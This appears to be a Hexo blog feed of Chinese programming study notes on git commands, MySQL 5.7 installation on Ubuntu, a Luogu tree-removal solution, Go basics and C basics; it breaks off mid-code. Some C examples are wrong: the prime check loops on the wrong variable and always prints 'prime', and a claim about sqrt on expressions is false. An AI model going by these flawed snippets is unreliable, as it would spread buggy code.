HEAD</code> 对比和版本库的差距</p></li><li><p><code>git diff cached</code> 对比暂存区和版本库的差异</p></li><li><p><code>git fiff 版本号1 版本号2</code> 比较两个版本之间的差异，可以将版本2换成<code>HEAD</code></p></li><li><p><code>git diff HEAD~2 HEAD</code>比较上2个版本的区别，省略数字代表和上一个版本比较</p></li><li><p><code>git diff HEAD~2 HEAD 文件名</code> 比较指定的文件的差异</p></li><li><p><code>git diff 分支名1 分支名2</code> 比较两个分支名的区别</p></li></ul></li><li><p>删除文件</p><p><code>git ls-files</code> 缓存区的内容</p><ul><li><p>方法一</p><p>使用<code>rm</code>删除本地文件</p></li><li><p>方法二</p><p>使用<code>git rm</code> 将文件从工作区和缓存区都删除掉</p></li></ul><p><img src="https://pictuures-1317182407.cos.ap-chengdu.myqcloud.com/gitrm.png"></p></li></ol><h2 id="远程仓库"><a href="#远程仓库" class="headerlink" title="远程仓库"></a>远程仓库</h2><ol><li><p><code>git clone</code></p><p>克隆仓库，如果没有配配置ssh将会报错</p></li><li><p>配置ssh</p></li><li><p>远程仓库的使用</p><p><img src="https://pictuures-1317182407.cos.ap-chengdu.myqcloud.com/%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93.jpg"></p><p><img src="https://pictuures-1317182407.cos.ap-chengdu.myqcloud.com/PushAndPull.jpg"></p><ul><li><p>关联远程仓库</p><ul><li><code> git remote add origin 远程仓库的地址</code> 关联远程创库</li><li><code>git branch -M main</code> 将分支的名字改为<code>main</code></li><li><code>git push -u origin main</code> 将本地的分支与远程创库的分支关联起来</li></ul></li><li><p>查看远程创库的</p><p><code>git remote -v</code></p></li></ul></li><li><p>分支</p><ul><li><p>创建分支</p><p><code>git branch +分支名</code> 创建一个新的分支</p></li><li><p>查看分支</p><p><code>git branch</code> 查看当前的分支</p></li><li><p>去到分支</p><p><code>git checkout dev1</code>去到第一个分支</p><p><code>git switch dev1</code>去到第一个分支</p></li><li><p>合并分支</p><p><code>git merge dev</code> 将分支dev合并到当前的分支</p></li><li><p>查看分支图</p><p><code>git log --graph  --oneline --decorate --all</code>查看分支图</p></li><li><p>删除分支</p><p><code>git branch -d dev1</code> 删除dev1分支</p></li></ul><p><img src="https://pictuures-1317182407.cos.ap-chengdu.myqcloud.com/gitrm.png"></p></li><li><p>解决分支冲突问题 </p><p><code>git commit -a -m</code>提交暂存和创库两个动作</p><p>当文件发生冲突的时候，我们需要手动的修改文件，然后将文件</p><p><img src="https://pictuures-1317182407.cos.ap-chengdu.myqcloud.com/%E5%88%86%E6%94%AF%E7%9A%84%E5%90%88%E5%B9%B6%E5%92%8C%E8%A7%A3%E5%86%B3%E5%86%B2%E7%AA%81.jpg"></p></li><li><p>使用变基</p><p><img src="https://pictuures-1317182407.cos.ap-chengdu.myqcloud.com/rebase.png"></p><p>从共同点开始之后的分支将会直接接在当前的分支后面</p></li><li><p>git分支流模型</p><ul><li><code>main</code></li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux实战</title>
    <link href="/2023/05/22/linux/Linux%E5%AE%9E%E6%88%98/"/>
    <url>/2023/05/22/linux/Linux%E5%AE%9E%E6%88%98/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Linux实战"><a href="#Linux实战" class="headerlink" title="Linux实战"></a>Linux实战</h1><h2 id="MySQL安装"><a href="#MySQL安装" class="headerlink" title="MySQL安装"></a>MySQL安装</h2><h3 id="ubuntu-5-7"><a href="#ubuntu-5-7" class="headerlink" title="ubuntu 5.7"></a>ubuntu 5.7</h3><ol><li><p>得到deb文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">wget https://dev.mysql.com/get/mysql-apt-config_0.8.12-1_all.deb<br></code></pre></td></tr></table></figure></li><li><p>配置源</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">dpkg -i mysql-apt-config_0.8.12-1_all.deb<br></code></pre></td></tr></table></figure></li><li><p>记得在<code>server</code>里面选择5.7</p></li><li><p>选择<code>OK</code></p></li><li><p>更新apt</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">1 sudo apt-get update<br></code></pre></td></tr></table></figure></li><li><p>查看是否有5.7的版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">1 apt-cache policy mysql-server<br></code></pre></td></tr></table></figure></li><li><p>安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">apt-get install -s mysql-client=5.7.*<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>校门外的树</title>
    <link href="/2023/05/11/%E7%AE%97%E6%B3%95/luogu/%E6%A0%A1%E9%97%A8%E5%A4%96%E7%9A%84%E6%A0%91/"/>
    <url>/2023/05/11/%E7%AE%97%E6%B3%95/luogu/%E6%A0%A1%E9%97%A8%E5%A4%96%E7%9A%84%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<p>[校门外的树]([P1047 <a href="https://www.luogu.com.cn/problem/P1047">NOIP2005 普及组] 校门外的树 - 洛谷 | 计算机科学教育新生态 (luogu.com.cn)</a>)</p><h1 id="NOIP2005-普及组-校门外的树"><a href="#NOIP2005-普及组-校门外的树" class="headerlink" title="[NOIP2005 普及组] 校门外的树"></a>[NOIP2005 普及组] 校门外的树</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>某校大门外长度为 $l$ 的马路上有一排树，每两棵相邻的树之间的间隔都是 $1$ 米。我们可以把马路看成一个数轴，马路的一端在数轴 $0$ 的位置，另一端在 $l$ 的位置；数轴上的每个整数点，即 $0,1,2,\dots,l$，都种有一棵树。</p><p>由于马路上有一些区域要用来建地铁。这些区域用它们在数轴上的起始点和终止点表示。已知任一区域的起始点和终止点的坐标都是整数，区域之间可能有重合的部分。现在要把这些区域中的树（包括区域端点处的两棵树）移走。你的任务是计算将这些树都移走后，马路上还有多少棵树。</p><h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>第一行有两个整数，分别表示马路的长度 $l$ 和区域的数目 $m$。</p><p>接下来 $m$ 行，每行两个整数 $u, v$，表示一个区域的起始点和终止点的坐标。</p><h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>输出一行一个整数，表示将这些树都移走后，马路上剩余的树木数量。</p><h2 id="样例-1"><a href="#样例-1" class="headerlink" title="样例 #1"></a>样例 #1</h2><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入 #1"></a>样例输入 #1</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">500 </span><span class="hljs-number">3</span><br><span class="hljs-symbol">150 </span><span class="hljs-number">300</span><br><span class="hljs-symbol">100 </span><span class="hljs-number">200</span><br><span class="hljs-symbol">470 </span><span class="hljs-number">471</span><br></code></pre></td></tr></table></figure><h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出 #1"></a>样例输出 #1</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">298<br></code></pre></td></tr></table></figure><h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><p><strong>【数据范围】</strong></p><ul><li>对于 $20%$ 的数据，保证区域之间没有重合的部分。</li><li>对于 $100%$ 的数据，保证 $1 \leq l \leq 10^4$，$1 \leq m \leq 100$，$0 \leq u \leq v \leq l$。</li></ul><ol><li><p>代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Range</span> &#123;<br>    <span class="hljs-type">int</span> begin;<br>    <span class="hljs-type">int</span> end;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">com</span><span class="hljs-params">(Range a, Range b)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (a.begin == b.begin) &#123;<br>        <span class="hljs-keyword">return</span> a.end &gt; b.end;<span class="hljs-comment">//如果相等，就按照end反向排序</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> a.begin &lt; b.begin;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> sum, n;<br>    cin &gt;&gt; sum &gt;&gt; n;<br>    Range ranges[n];<span class="hljs-comment">//存放范围</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; ++i) &#123;<br>        cin &gt;&gt; ranges[i].begin &gt;&gt; ranges[i].end;<br>    &#125;<br>    <span class="hljs-built_in">sort</span>(ranges, ranges + n, com);<br>    sum += <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> maxEnd = <span class="hljs-number">-1</span>;<span class="hljs-comment">//第一次一定会运行到最后</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; ++i) &#123;<br>        <span class="hljs-keyword">if</span> (ranges[i].end &lt;= maxEnd) &#123;<span class="hljs-comment">//整个范围都被减掉</span><br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">0</span> &amp;&amp; maxEnd &gt;= ranges[i].begin) &#123;<span class="hljs-comment">//前面部分被剪掉</span><br>            sum -= ( ranges[i].end-maxEnd);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//dou&#x27;zai&#x27;wa&#x27;ni</span><br>            sum -= (ranges[i].end - ranges[i].begin + <span class="hljs-number">1</span>);<br>        &#125;<br>        maxEnd=ranges[i].end;<br>    &#125;<br>    cout &lt;&lt; sum;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>提示</p><ul><li>抽象成数组</li><li>记得sum+&#x3D;1,因为0处也有树</li><li>通过排序算法，更好的固定范围</li></ul></li><li><p>理解</p><ul><li>将所有的树抽象成为了数周上面的点，然后我们通过范围，判断sum的减数</li><li>本题有三个特殊的情况<ul><li>某一次的范围都在已经减了的范围，由于排了序，我们只需要判断后面的范围</li><li>前面部分已经被减，我们就需要记录的maxEnd来确定范围</li><li>完全没有被减过</li></ul></li></ul></li><li><p>问题</p><p>- </p><blockquote></blockquote></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>那些年刷过的算法题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>go随记</title>
    <link href="/2023/05/08/go/go%E9%9A%8F%E8%AE%B0/"/>
    <url>/2023/05/08/go/go%E9%9A%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="go随记"><a href="#go随记" class="headerlink" title="go随记"></a>go随记</h1><ol><li><p>使用<code>make(切片类型，个数)</code>对切片初始化</p></li><li><p><code>var str string=strconv.Itoa(x)</code>将x整形转变为string</p></li><li><p><code>strconv.ParseInt</code> 是将字符串转换为数字的函数</p></li><li><p>数组使用<code>var</code>方式创建会初始化</p></li><li><p><code>copy</code>复制的方式用于切片或者<code>string</code></p></li><li><p>go语言字符是byte,通过码值的形式，实现</p></li><li><p>使用<code>%v</code>打印各种类型</p><p><img src="https://go-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/%25v%E7%9A%84%E5%90%84%E7%A7%8D%E5%BD%A2%E5%BC%8F.png"></p></li><li><p>go语言会自动地初始化</p></li><li><p>全局变量不支持使用自动推导的方式进行初始化</p></li><li><p>使用const模拟枚举</p></li><li><p>在包内的函数，如果是小写，那么只能在包内使用，大写才能在包外正常使用</p></li><li><p>init()，用于包的初始化，优先调用</p></li><li><p>如果对一个包不适用的的话</p><p>可以在前面加入_</p><p>如果包名太长可以在前面加上自己的名字</p><p>如果使用的<code>.</code>则不需要包名，就可使用白里面的函数，但是这样本包就不能写同名函数</p></li><li><p>使用打印函数可以直接打印切片，以及数组</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-comment">//直接声明并且初始化</span><br>    ints := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;<br>    <span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> ints &#123;<br>        fmt.Println(v)<br>    &#125;<br>    <br>    <span class="hljs-comment">//先声明再创建空间</span><br>    <span class="hljs-keyword">var</span> ints2 []<span class="hljs-type">int</span><br>    ints2 = <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> ints2 &#123;<br>        fmt.Println(v)<br>    &#125;<br>    fmt.Println(ints)<br>    <br>    ints3 := [<span class="hljs-number">3</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>&#125;<br>    fmt.Println(ints3)<br>    <br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>如果切片的长度超了，我们使用<code>append</code>,容量会变成原来的两倍</p></li><li><p>切片的下标截取，相当于得到的是地址，所以当修改截取的数组的时候，原来的数组也会发生变化，如果是使用的是<code>copy</code>则只是一个拷贝</p></li><li><p>类的首字母大写，才能在其他包访问到类</p></li><li><p>go语言的匿名函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>            <span class="hljs-keyword">defer</span> fmt.Println(<span class="hljs-string">&quot;this is A.defer&quot;</span>)<br>            i := <span class="hljs-number">0</span><br>            <span class="hljs-keyword">for</span> i &lt; <span class="hljs-number">10</span> &#123;<br>                i++<br>                fmt.Println(<span class="hljs-string">&quot;this is goRoutine : &quot;</span>, i)<br>                time.Sleep(<span class="hljs-number">1</span> * time.Second)<br>            &#125;<br>            fmt.Println(<span class="hljs-string">&quot;A&quot;</span>)<br>    <br>            <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>                <span class="hljs-keyword">defer</span> fmt.Println(<span class="hljs-string">&quot;this is B.defer&quot;</span>)<br>                fmt.Println(<span class="hljs-string">&quot;this is B&quot;</span>)<br>            &#125;()<br>        &#125;() <span class="hljs-comment">//加小括号是为了调用</span><br></code></pre></td></tr></table></figure></li><li><p>使用<code>runtime.Goexit()</code>退出当前的<code>goroutine</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>            <span class="hljs-keyword">defer</span> fmt.Println(<span class="hljs-string">&quot;this is A.defer&quot;</span>)<br>            i := <span class="hljs-number">0</span><br>            <span class="hljs-keyword">for</span> i &lt; <span class="hljs-number">10</span> &#123;<br>                i++<br>                fmt.Println(<span class="hljs-string">&quot;this is goRoutine : &quot;</span>, i)<br>                time.Sleep(<span class="hljs-number">1</span> * time.Second)<br>            &#125;<br>            fmt.Println(<span class="hljs-string">&quot;A&quot;</span>)<br>    <br>            <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>                <span class="hljs-keyword">defer</span> fmt.Println(<span class="hljs-string">&quot;this is B.defer&quot;</span>)<br>                fmt.Println(<span class="hljs-string">&quot;this is B&quot;</span>)<br>            &#125;()<br>        &#125;() <span class="hljs-comment">//加小括号是为了调用</span><br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C语言平常笔记</title>
    <link href="/2023/05/07/C/C%E8%AF%AD%E8%A8%80%E5%B9%B3%E5%B8%B8%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/05/07/C/C%E8%AF%AD%E8%A8%80%E5%B9%B3%E5%B8%B8%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="C语言平常笔记"><a href="#C语言平常笔记" class="headerlink" title="C语言平常笔记"></a>C语言平常笔记</h1><ol><li><p>在在自定义函数中使用sqrt函数，必须将开方数，重定义如（double）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">n_prime</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span><br>&#123;<br><span class="hljs-type">int</span> x=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(x=<span class="hljs-number">2</span>;x&lt;<span class="hljs-built_in">sqrt</span>((<span class="hljs-type">double</span>)x);x++)<br>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-number">0</span>==a%x)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;this is not a prime&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;this is a prime&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> num=<span class="hljs-number">0</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入判断的数：&quot;</span>);<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;num);<br>n_prime(num);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>getchar的用法：如果单独只用gerchar(),则只取一个字符。把getcahr 放入循环中则可读取输入进去的所有值，包括（‘\n’,’ ‘）,但是scanf,只读取缓冲区中‘\n’之前的，\n是因为键盘使用了回车</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//这是一个计算输入数字中字母，数字，空格，和其他字符的代码</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">char</span> arr;<br><span class="hljs-type">int</span> letters=<span class="hljs-number">0</span>,numbers=<span class="hljs-number">0</span>,spaces=<span class="hljs-number">0</span>,others=<span class="hljs-number">0</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入查找的字符串：&quot;</span>);<span class="hljs-comment">//存放得到的字符串</span><br><span class="hljs-keyword">while</span>((arr=getchar())!=<span class="hljs-string">&#x27;\n&#x27;</span>)<span class="hljs-comment">//必须放入循环</span><br>&#123;<br><span class="hljs-keyword">if</span>(arr&gt;=<span class="hljs-string">&#x27;a&#x27;</span>&amp;&amp;arr&lt;=<span class="hljs-string">&#x27;z&#x27;</span>||arr&gt;<span class="hljs-string">&#x27;A&#x27;</span>&amp;&amp;arr&lt;<span class="hljs-string">&#x27;Z&#x27;</span>)<br>&#123;<br>letters++;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(arr&gt;=<span class="hljs-string">&#x27;0&#x27;</span>&amp;&amp;arr&lt;=<span class="hljs-string">&#x27;9&#x27;</span>)<br>&#123;<br>numbers++;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27; &#x27;</span>==arr)<br>&#123;<br>spaces++;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>others++;<br>&#125;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;letters=%d\nnumber=%d\nspace=%d\nothers=%d\n&quot;</span>,letters,numbers,spaces,others);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>staticu作用：</p><p>3.1 隐藏该语句</p><p>3.2 被static修饰的变量存活时间更长</p><p>3.3 初始化变量为0</p></li><li><p>typedef</p><p>4.1 取别名： typedef 类型 别名</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//数组起别名</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">3</span>];<br><span class="hljs-built_in">array</span> arr=&#123;<span class="hljs-number">0</span>，<span class="hljs-number">1</span>，<span class="hljs-number">2</span>&#125;；<span class="hljs-comment">//定义的一维数组</span><br><span class="hljs-built_in">array</span> arr2[<span class="hljs-number">3</span>]=&#123;<span class="hljs-number">0</span>，<span class="hljs-number">1</span>，<span class="hljs-number">2</span>，<span class="hljs-number">3</span>，<span class="hljs-number">4</span>，<span class="hljs-number">5</span>，<span class="hljs-number">6</span>，<span class="hljs-number">7</span>，<span class="hljs-number">8</span>&#125;;<span class="hljs-comment">//定义2维数组</span><br><br></code></pre></td></tr></table></figure></li><li><p>指针大小在32位是4，在64位是8</p></li><li><p>输出中间取位</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> a=<span class="hljs-number">2</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%.4d&quot;</span>,a);<br><span class="hljs-comment">//结果位0002</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%4d&quot;</span>,a);<br><span class="hljs-comment">//结果为   2</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%-4d&quot;</span>,a);<br><span class="hljs-comment">//结果为2    (有3个空格)</span><br></code></pre></td></tr></table></figure></li><li><p>sqrt() 函数：括号里里面，放变量名</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">A=b*b<span class="hljs-number">-4</span>*a*c;<br><span class="hljs-built_in">sqrt</span>(b*b<span class="hljs-number">-4</span>*a*c);<br><span class="hljs-comment">//不太行</span><br><span class="hljs-built_in">sqrt</span>(A);<br><span class="hljs-comment">//可以</span><br></code></pre></td></tr></table></figure></li><li><p>double,可以用来表示整数</p></li><li><p>取一个高位数，从头开始取</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//例如</span><br><br>a=x/<span class="hljs-number">10000</span>;<br>b=x%<span class="hljs-number">1000</span>/<span class="hljs-number">100</span>;<br>c=x%<span class="hljs-number">100</span>/<span class="hljs-number">10</span>;<br>d=x%<span class="hljs-number">10</span>;<br></code></pre></td></tr></table></figure></li><li><p>乘法符号不能省略</p></li><li><p>如果想使用除法输出小数，先转化再除法</p></li><li><p>define常量，不用加<code>‘;’</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> count 5</span><br><span class="hljs-comment">//就好了</span><br></code></pre></td></tr></table></figure></li><li><p>局部变量是放在栈区上的，栈区内存的使用习惯是，先使用高地址，再使用低地址</p></li><li><p>size_t:它是为了方便系统之间的移植而定义的，不同的系统上，定义size_t 可能不一样。size_t在32位系统上定义为 unsigned int，也就是32位无符号<a href="https://so.csdn.net/so/search?q=%E6%95%B4%E5%9E%8B&spm=1001.2101.3001.7020">整型</a>。在64位系统上定义为 unsigned long ，也就是64位无符号整形</p></li><li><p>清空外部控制台：<code>system(&quot;cls&quot;);</code>,头文件是：<code>stdlib.h</code>。</p></li><li><p><code>void</code>函数<code>return ;</code></p></li><li><p>对于结构体的引用</p><ul><li>若使用地址使用结构体内的成员，使用<code>-&gt;</code></li><li>若直接通过使用结构体的名字则使用：<code>.</code></li></ul></li><li><p>对于链表的使用，应该将所有元素都初始化</p></li><li><p>使用<code>malloc</code>时，需要判断是否申请内存成功</p></li><li><p>判断存储方式</p><ul><li>大端存储：低位存在高地址</li><li>小端存储：低位存放在低地址</li><li>用共同体判断存储方式</li></ul></li><li><p>枚举类型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">sex</span>&#123;</span>man, woman&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> a = <span class="hljs-number">0</span>;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">sex</span> <span class="hljs-title">chg</span> =</span> <span class="hljs-number">0</span>;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;a);<br>chg = a == <span 